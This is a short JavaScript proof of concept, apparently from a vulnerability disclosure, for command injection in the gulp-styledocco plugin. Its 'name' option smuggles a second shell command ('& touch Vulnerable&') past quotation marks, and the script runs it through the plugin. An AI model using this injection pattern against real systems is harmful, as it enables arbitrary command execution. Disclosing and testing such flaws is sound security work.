var root = require("gulp-styledocco");
var gulp = require("gulp");
var options = {
  opt: 'docs',
  name: "123\"& touch Vulnerable& \""
}

gulp.src("./poc.js")
  .pipe(root(options));
